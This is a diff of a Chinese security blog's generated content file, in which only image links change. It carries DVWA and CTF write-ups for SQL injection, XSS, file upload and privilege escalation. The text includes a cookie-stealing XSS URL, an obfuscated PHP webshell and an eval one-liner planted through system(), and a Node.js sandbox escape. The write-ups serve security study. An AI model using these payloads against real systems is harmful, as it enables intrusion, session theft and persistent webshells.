 <p><a href="http://192.168.0.105/DVWA-1.9/vulnerabilities/fi/?page=httphttp://://192.168.0.105/DVWA-1.9/hackable/uploads/a.png">http://192.168.0.105/DVWA-1.9/vulnerabilities/fi/?page=httphttp://://192.168.0.105/DVWA-1.9/hackable/uploads/a.png</a></p>
 <p>因为文件包含漏洞，不管文件后缀是否是php，都会尝试当做php文件执行。</p>
-<h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><img src="http://img.kawhi.xyz/image-20200315164336513.png" alt="image-20200315164336513" style="high:80%;width:80%;" />
+<h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315164336513.png" alt="image-20200315164336513" style="high:80%;width:80%;" />
 
 <p>通过查看源码发先依旧采用白名单过滤，只允许上传的文件后缀名为jpg、jpeg、png。</p>
 <p>但是会读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，会报错。</p>
 <p>这里可以使用图片隐写的方式把一句话木马写到图片里面再上传，再到菜刀里面使用文件包含的形式打开</p>
 <p>图片即可获取webshell</p>
-<h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><img src="http://img.kawhi.xyz/image-20200315164841208.png" alt="image-20200315164841208" style="high:80%;width:80%;" />
+<h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315164841208.png" alt="image-20200315164841208" style="high:80%;width:80%;" />
 
 <p>可以看到加入了token，以及对上传的文件进行了重命名，彻底杜绝了文件上传漏洞。</p>
 <h1 id="SQL回显注入"><a href="#SQL回显注入" class="headerlink" title="SQL回显注入"></a><strong>SQL回显注入</strong></h1><hr>
@@ -609,21 +609,21 @@
 <p>⑥获取数据</p>
 <h2 id="low等级-1"><a href="#low等级-1" class="headerlink" title="low等级"></a><strong>low等级</strong></h2><p>依次尝试1’ or ‘1’=’1，1 or 1=1，1“ or “1”=”1三种，发现变量的外面为单引号。存在字符型SQL注入。</p>
 <p>接下来就可以查询数据库，用户名等等甚至可以写入Webshell，这里就不一一尝试了。</p>
-<img src="http://img.kawhi.xyz/image-20200315170643403.png" alt="image-20200315170643403" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315170643403.png" alt="image-20200315170643403" style="high:80%;width:80%;" />
 
 <h2 id="Medium等级-1"><a href="#Medium等级-1" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看源代码</p>
-<img src="http://img.kawhi.xyz/image-20200315171449765.png" alt="image-20200315171449765" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315171449765.png" alt="image-20200315171449765" style="high:80%;width:80%;" />
 
 <p>发现利用mysql_real_escape_string()函数转义了sql的特殊符号</p>
 <p>而且设置了下拉框，控制用户输入</p>
-<img src="http://img.kawhi.xyz/image-20200315171807295.png" alt="image-20200315171807295" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315171807295.png" alt="image-20200315171807295" style="high:80%;width:80%;" />
 
 <p>这里直接burp suite抓包改值即可</p>
 <p>如果遇到有的地方需要单引号，可以使用hex编码转换一下即可</p>
 <h2 id="High等级-1"><a href="#High等级-1" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><p>High级别在SQL查询语句中添加了LIMIT 1，以此控制只输入一个结果。</p>
 <p>虽然添加了LIMIT 1，但是可以通过– 将其注释掉即可。</p>
 <p>其他操作和low一致</p>
-<h2 id="Impossible等级-1"><a href="#Impossible等级-1" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><img src="http://img.kawhi.xyz/image-20200315174243384.png" alt="image-20200315174243384" style="high:80%;width:80%;" />
+<h2 id="Impossible等级-1"><a href="#Impossible等级-1" class="headerlink" title="Impossible等级"></a><strong>Impossible等级</strong></h2><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315174243384.png" alt="image-20200315174243384" style="high:80%;width:80%;" />
 
 <p>查看源码使用了PDO，划清了代码与数据的界限，有效防御SQL注入。</p>
 <h1 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a><strong>SQL盲注</strong></h1><ul>
@@ -643,7 +643,7 @@
 </ul>
 <p>直接输入</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<img src="http://img.kawhi.xyz/image-20200315200324914.png" alt="image-20200315200324914" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315200324914.png" alt="image-20200315200324914" style="high:80%;width:80%;" />
 
 <ul>
 <li><strong>获取cookie</strong></li>
@@ -652,18 +652,18 @@
 <p>然后让用户点击带有js脚本的url，如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.0.100/DVWA-1.9/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>用户点击之后我们www的目录下就会生成cookie.txt文件，成功获取用户的cookie值。</p>
-<img src="http://img.kawhi.xyz/image-20200315204539470.png" alt="image-20200315204539470" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315204539470.png" alt="image-20200315204539470" style="high:80%;width:80%;" />
 
 <p>再修改刚刚获取的cookie值放进去就可以以admin的身份进入。</p>
 <h2 id="Medium等级-3"><a href="#Medium等级-3" class="headerlink" title="Medium等级"></a><strong>Medium等级</strong></h2><p>查看源代码</p>
-<img src="http://img.kawhi.xyz/image-20200315205547446.png" alt="image-20200315205547446" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315205547446.png" alt="image-20200315205547446" style="high:80%;width:80%;" />
 
 <p>发现script标签被替换为空了</p>
 <p>使用嵌套即可绕过如：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>或者大小写混合也可</p>
 <h2 id="High等级-3"><a href="#High等级-3" class="headerlink" title="High等级"></a><strong>High等级</strong></h2><p>查看源代码</p>
-<img src="http://img.kawhi.xyz/image-20200315211243037.png" alt="image-20200315211243037" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200315211243037.png" alt="image-20200315211243037" style="high:80%;width:80%;" />
 
 <p>使用preg_replace() 函数用于正则表达式的搜索和替换，将script前后相关的内容都替换为空，使得双写绕过、大小写混淆绕过不再有效。</p>
 <p>但是可以通过img、body等标签事件或者iframe等标签的src注入恶意的js代码。</p>
@@ -688,7 +688,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>
 
 <p>成功连接上蚁剑：</p>
-<img src="http://img.kawhi.xyz/image-20200506153323919.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200506153323919.png" style="high:100%;width:100%;" />
 
 <h4 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h4><p>题目直接给出了源代码：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span>. md5(<span class="string">&quot;De1CTF2020&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="meta">@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&quot;submit&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            die($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;_&quot;</span>.$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $filename);</span><br><span class="line">            echo <span class="string">&quot;save in:&quot;</span> . $sandbox.<span class="string">&quot;/&quot;</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;Not Allow!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts = array(<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    $ext = explode(<span class="string">&quot;.&quot;</span>, $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9;~^`&amp;|]/is&#x27;</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -699,20 +699,20 @@
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?= $_=[] ?&gt; </span><br><span class="line">&lt;?= $_=@&quot;$_&quot; #Array ?&gt;</span><br><span class="line">&lt;?= $_=$_[(&#x27;!&#x27;==&#x27;@&#x27;)] #(&#x27;!&#x27;==&#x27;@&#x27;) results in 0 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;</span><br><span class="line">&lt;?= $_______ = &quot;_&quot;.$__ #_G ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GE ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GET ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $&#123;$_______&#125;[&quot;_&quot;]($&#123;$_______&#125;[&quot;__&quot;]) # $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这个<code>$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]) ?&gt;</code>第一个参数是构造函数名，第二个构造函数的参数。</p>
-<img src="http://img.kawhi.xyz/image-20200507181225122.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181225122.png" style="high:100%;width:100%;" />
 
 <p>像这样就可以getshell了，但是想要连上蚁剑还得自己写一个一句话木马进去。</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://47.113.219.76/uploads/bf0688c36193e28a369a9e96517e4c2f/0d253abf34c57f57099249cd1737873b_6.phP?_=system&amp;__=echo%20&quot;&lt;?php%20eval($_POST[%27a%27])?&gt;&quot;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>
 
 <p>然后就可以成功连上蚁剑了</p>
-<img src="http://img.kawhi.xyz/image-20200507181750012.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181750012.png" style="high:100%;width:100%;" />
 
 <p>但是在蚁剑的终端输入<code>whoami</code>发现权限不够。</p>
 <p>于是上传<code>cmd.exe</code>和<code>ms08066</code>在冰蝎里面进行提权。</p>
-<img src="http://img.kawhi.xyz/image-20200507181915887.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181915887.png" style="high:100%;width:100%;" />
 
 <p>提权成功后发现</p>
-<img src="http://img.kawhi.xyz/image-20200507182333363.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507182333363.png" style="high:100%;width:100%;" />
 
 <p>在<code>//192.168.0.12/Hint/</code>找到一个压缩包，下载下来发现有密码。</p>
 <p>然后就涉及到域渗透的内容，具体参考：<a class="foo" href="https://3gstudent.github.io/3gstudent.github.io/域渗透-利用SYSVOL还原组策略中保存的密码/" target="_blank">传送门</a></p>
@@ -720,36 +720,36 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>
 
 <p>然后输入<code>ipconfig /all</code>发现</p>
-<img src="http://img.kawhi.xyz/image-20200507182903605.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507182903605.png" style="high:100%;width:100%;" />
 
 <p>就是说通过域内的共享文件夹保存了密码，微软把密钥公开了，所以可以通过破解这个密钥得到管理员的密码。</p>
 <p>找到保存密码的地方</p>
-<img src="http://img.kawhi.xyz/image-20200507183414569.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507183414569.png" style="high:100%;width:100%;" />
 
 <p>打开发现密钥</p>
-<img src="http://img.kawhi.xyz/image-20200507183526055.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507183526055.png" style="high:100%;width:100%;" />
 
 <p>然后用kail自带的gpp-decrypt解密</p>
-<img src="http://img.kawhi.xyz/image-20200508150215105.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508150215105.png" style="high:100%;width:100%;" />
 
 <p>打开之前得到的压缩包输入密码即可得到flag。</p>
 <h4 id="life"><a href="#life" class="headerlink" title="life"></a><strong>life</strong></h4><p>题目hint:No Game No Life!</p>
 <p>这道题下载下来是一张图片，用<code>foremost</code>分离之后得到一个带密码的压缩包和一张类型二维码的图片。</p>
-<img src="http://img.kawhi.xyz/image-20200508175230822.png" style="high:50%;width:50%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175230822.png" style="high:50%;width:50%;" />
 
 <p>这里需要了解一下生命游戏：<a class="foo" href="https://blog.csdn.net/u011439689/article/details/17226237" target="_blank">传送门</a></p>
 <p>然后有个网站可以模拟生命游戏：<a class="foo" href="https://funnyjs.com/jspages/game-of-life.html" target="_blank">传送门</a></p>
-<img src="http://img.kawhi.xyz/image-20200508175630302.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175630302.png" style="high:80%;width:80%;" />
 
 <p>这里需要自己一个点一个点画上去，然后点击单步。</p>
-<img src="http://img.kawhi.xyz/image-20200508175832975.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175832975.png" style="high:80%;width:80%;" />
 
 <p>可以看到一个二维码，扫描二维码就可以得到压缩包的密码。</p>
 <p>解开压缩包之后发现txt文件有一串数字</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ</span><br></pre></td></tr></table></figure>
 
 <p>然后可以到<code>cyberchef</code>解密：</p>
-<img src="http://img.kawhi.xyz/image-20200508180050173.png" style="high:100%;width:100%;" />]]></content>
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508180050173.png" style="high:100%;width:100%;" />]]></content>
       <categories>
         <category>CTF比赛</category>
       </categories>
@@ -860,7 +860,7 @@
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        function js_unescape($str) &#123;</span><br><span class="line">                $ret = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                $len = strlen($str);</span><br><span class="line">                <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $len;$i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span> &amp;&amp; $str[$i + <span class="number">1</span>] == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                                $val = hexdec(substr($str, $i + <span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                                <span class="keyword">if</span> ($val &lt; <span class="number">0x7f</span>) $ret.= chr($val);</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> ($val &lt; <span class="number">0x800</span>) $ret.= chr(<span class="number">0xc0</span> | ($val &gt;&gt; <span class="number">6</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                <span class="keyword">else</span> $ret.= chr(<span class="number">0xe0</span> | ($val &gt;&gt; <span class="number">12</span>)) . chr(<span class="number">0x80</span> | (($val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                $i+= <span class="number">5</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">                                $ret.= urldecode(substr($str, $i, <span class="number">3</span>));</span><br><span class="line">                                $i+= <span class="number">2</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> $ret.= $str[$i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $ret;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = js_unescape($_POST[<span class="string">&#x27;htmlcode&#x27;</span>]);  //对获得源码js_unescape解码。</span><br><span class="line">        $filename = $_POST[<span class="string">&#x27;filename&#x27;</span>] . date(<span class="string">&quot;y-m-d-h-i-s&quot;</span>) . <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">        $myfile = fopen($filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite($myfile, $data);</span><br><span class="line">        fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>然后在content处访问CSRF表单即可</p>
-<img src="http://img.kawhi.xyz/image-20200616230446072.png" alt="image-20200616230446072" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616230446072.png" alt="image-20200616230446072" style="high:80%;width:80%;" />
 
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="py吗？"><a href="#py吗？" class="headerlink" title="py吗？"></a><strong>py吗？</strong></h2><p>题目是一张老外穿着python文化衫的图片。</p>
 <p>修改正常高度恢复正常的crc32校验。</p>
@@ -870,7 +870,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret<span class="number">-1</span></span><br><span class="line">secret<span class="number">-2</span></span><br><span class="line">secret<span class="number">-3</span></span><br><span class="line">secret<span class="number">-4</span></span><br></pre></td></tr></table></figure>
 
 <p>这里看官方wp是伪加密修改这里。</p>
-<img src="http://img.kawhi.xyz/image-20200616091015847.png" alt="image-20200616091015847" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616091015847.png" alt="image-20200616091015847" style="high:80%;width:80%;" />
 
 <p>然后文件4合1</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy /b <span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>+<span class="number">4</span> new.txt</span><br></pre></td></tr></table></figure>
@@ -880,7 +880,7 @@
 
 <p>得到汉信码扫码可得flag。</p>
 <h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>在wireshark里面导出Http对象列表，发现flag.jpg，改zip后缀</p>
-<img src="http://img.kawhi.xyz/image-20200616104946314.png" alt="image-20200616104946314" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616104946314.png" alt="image-20200616104946314" style="high:80%;width:80%;" />
 
 <p>然后crc32解密</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python crc32.py reverse <span class="number">0xC</span>RC32</span><br></pre></td></tr></table></figure>
@@ -915,13 +915,13 @@
 <p>参考：<a class="foo" href="http://www.nctry.com/1660.html" target="_blank">传送门</a></p>
 <p>然后在假flag告知下得知真flag在/root目录下，但是因为当前是www-data用户是没有权限访问/root目录的。</p>
 <p>然后在根目录下发现auto.sh</p>
-<img src="http://img.kawhi.xyz/image-20200526220703847.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220703847.png" style="high:80%;width:80%;" />
 
-<img src="http://img.kawhi.xyz/image-20200526220146582.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220146582.png" style="high:80%;width:80%;" />
 
 <p>输入ps -ef发现auto.sh是root权限执行的。</p>
 <p>然后在/var/mail/makeflaghint.py修改一下代码，加入两行内容读取/root/flag到/flag.hint</p>
-<img src="http://img.kawhi.xyz/image-20200526220613995.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220613995.png" style="high:80%;width:80%;" />
 
 <p>然后在flag.hint里面成功读取flag。</p>
 <h4 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a><strong>CheckIN</strong></h4><p>源码</p>
@@ -934,24 +934,24 @@
 <p>base64加密得ZXZhbCgkX1BPU1RbY21kXSk7</p>
 <p>在根目录看到一个flag，但是没有权限查看，还有一个readflag文件。</p>
 <p>但是发现蚁剑终端并不能用，回到phpinfo()发现很多方法被禁用。</p>
-<img src="http://img.kawhi.xyz/image-20200526225116128.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225116128.png" style="high:80%;width:80%;" />
 
 <p>过滤了很多function，想到绕过disable_functions，上传一个文件使其执行任意命令，exp地址：<a class="foo" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank">传送门</a></p>
 <p>在这里稍微改一下。</p>
-<img src="http://img.kawhi.xyz/image-20200526225159436.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225159436.png" style="high:80%;width:80%;" />
 
 <p>然后在页面就可以得到flag。</p>
-<img src="http://img.kawhi.xyz/image-20200526225043564.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225043564.png" style="high:80%;width:80%;" />
 
 <h4 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a><strong>cve版签到</strong></h4><p>通过%00截断可以让<code>get_headers()</code>请求到错误的主机，于是请求到本地。</p>
-<img src="http://img.kawhi.xyz/image-20200526231215560.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526231215560.png" style="high:80%;width:80%;" />
 
 <p>再根据提示把后缀改为123</p>
-<img src="http://img.kawhi.xyz/image-20200526231327900.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526231327900.png" style="high:80%;width:80%;" />
 
 <p>即可得到flag。</p>
 <h4 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a><strong>EZ三剑客-EzWeb</strong></h4><p>访问?secret得到本机ip</p>
-<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114207278.png" style="high:80%;width:80%;" />
 
 <p>写个脚本探测内网</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>
@@ -959,7 +959,7 @@
 <p>跑出结果4 5 6 7 10 11</p>
 <p>一个一个试，11的时候给出了提示。</p>
 <p>然后用burp爆破端口</p>
-<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114920600.png" style="high:80%;width:80%;" />
 
 <p>payloads选numbers爆破1到65535端口，线程选1。</p>
 <p>爆破出结果6374。</p>
@@ -988,19 +988,19 @@
 <p>payload(post提交)</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=setInterval.constructor(<span class="string">&#x27;return process&#x27;</span>)().mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200601151723022.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601151723022.png" style="high:80%;width:80%;" />
 
 <h4 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a><strong>Pokémon</strong></h4><p>下载得到一个gba文件，用<code>VisualBoyAdvance</code>打开，玩游戏即可得到flag。</p>
 <h4 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a><strong>code obfuscation</strong></h4><p>得到一张残缺的二维码图片</p>
 <p>然后在这个网站上面修补：<a class="foo" href="https://merricx.github.io/qrazybox/" target="_blank">传送门</a></p>
 <p>或者使用ps修复也行</p>
-<img src="http://img.kawhi.xyz/image-20200601172717498.png" style="high:50%;width:50%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601172717498.png" style="high:50%;width:50%;" />
 
 <p>扫二维码得gkctf，再base58解密得到压缩包密码CfjxaPF。</p>
 <h4 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a><strong>Harley Quinn</strong></h4><p>得到一段音频，最后面有拨号音，剪切之后丢到dtmf里面。</p>
 <p>解得#222833344477773338866# 根据hint九键输出ctfisfun。</p>
 <p>下载hint所说的软件, FreeFileCamouflage。</p>
-<img src="http://img.kawhi.xyz/image-20200601182225212.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601182225212.png" style="high:80%;width:80%;" />
 
 <p>输入密钥和图片地址得到flag。</p>
 <h4 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a><strong>Sail a boat down the river</strong></h4><p>下载得一个flag.mp4有一帧是二维码，然后扫描得到一个网盘链接，但是没有提取码，根据视频里的摄像头闪光长短转换成<code>摩斯密码</code>。解码得<code>yw8g</code>。</p>
@@ -1009,7 +1009,7 @@
 
 <p>在这个网站可以自动求解数独：<a class="foo" href="http://www.llang.net/sudoku/calsudoku.html" target="_blank">传送门</a></p>
 <p>得到密钥<code>52693795149137</code>。</p>
-<img src="http://img.kawhi.xyz/image-20200601185426514.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601185426514.png" style="high:80%;width:80%;" />
 
